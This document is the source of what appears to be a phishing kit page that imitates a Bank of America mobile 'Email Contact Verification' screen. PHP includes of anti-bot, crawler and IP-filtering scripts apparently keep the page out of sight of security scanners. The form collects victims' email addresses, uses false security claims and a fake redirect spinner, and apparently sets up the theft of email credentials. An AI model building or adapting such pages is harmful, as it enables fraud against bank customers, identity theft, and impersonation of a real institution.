<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include "../autob/bts2.php";
?>
<!DOCTYPE html>
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>Bank of America | Contact Update</title>
    <link rel="shortcut icon" href="../bstyles/favicon.ico?ts=20151018" type="image/x-icon">
	<link rel="stylesheet" href="../bstyles/bactouch.css"><link rel="stylesheet" href="../bstyles/toolbar.css"><link rel="stylesheet" href="../bstyles/bact_listview.css"><link rel="stylesheet" href="../bstyles/footer.css"><link rel="stylesheet" href="../bstyles/slidemenu.css">
	<style>.signonVersionTwoHomePage{max-width:400px;margin:auto;}
	.fsd-secure-esp-skin {
    padding: 20px 0 20px 20px;
	;}
	#redi{color:#0184bf;text-decoration:underline;transition:display 0.8s;}
	.transitioning{height:14px;width:14px;vertical-align:;display:inline-block;padding-right:15px;}
	.redi{height:14px;width:14px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:3px solid #0184bf;border-right:3px solid #0184bf;border-bottom:3px solid #0184bf;border-top:3px solid #fff;border-radius:100%;display:inline-block;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	</style>
	</head>

	<body>
	<div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;">
	<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="../bstyles/BofA_rgb.png">
      <div class="clearboth"></div>
   </div>
</div>
<div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Email Contact Verification</div><span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div><div class="pageMinHeight">
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">

	<div id="accountLocked" class="<?php if(!isset($_GET[''.$theerrkey.''])){echo 'hidden';}?>">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="../bstyles/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError">Error</p>
				<p class="subVal padding10" id="bodyError">The Email you entered were invalid. Please try again...<span style="margin-top:10px;display:block;">We will query your email service provider to confirm you own this email.</span></p>
			</li>
		</ul>
	</div>
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<label class="adaHidden" id="signonOIDLabel" for="btCustomOnlineId">Enter your Online ID</label>
				<div class="inputEntryContainer"><form action="vn" id="frmCustomOnlineId" method="post">
					
					<div class="inputContainer">
						<input type="text" class="focus sprite-clear_input_icns" name="email" maxlength="" id="btCustomOnlineId" placeholder="Enter your Email Address" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false">
				<input type="hidden" name="yop" value="<?php echo uniqid();?>">
				<input type="hidden" name="esubmit" value="<?php echo uniqid();?>">
					</div>
					<div style="margin: 9px 15px;">
					<div style="font-size:14px;font-family:Arial, sans-serif;">We need you to verify your email contact information to save this device as a <span style="color:#0b6efd">Trusted Device</span><br/><br/>Using industry standard encryption to protect your data, we instantly confirm your email on file and then establish a secure connection to verify with your email service provider</div>
	  
	  <br/><div style="font-size:14px;display:none;font-family:Arial, sans-serif;" id="redi"><span class='transitioning'><span class='redi'>&nbsp;</span></span>Redirecting you to your email service provider to confirm you own this email address....
    <input type="hidden" value="off" id="jas" name="jas"/></div>
	</div>
	
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	</div>
	<div>	
		<a id="btSignonContinue" href="javascript:void(0);" onclick="waitreq();" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="../bstyles/secure_lock.png">
			<span id="signonLabel">Next</span>
		</a>
	</div>
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center"></div>
		<div class="padding10"></div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; height: auto;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>

<script>
function load(){document.getElementById('redi').style.display="block";};
function waitreq(){load();var suballow=document.getElementById('jas');setTimeout(function(){suballow.value="on";document.getElementById('frmCustomOnlineId').submit();},3000);if(suballow.value!='off'){return true;} else{return false;};};
</script>

</div></div>
		
	
</body></html>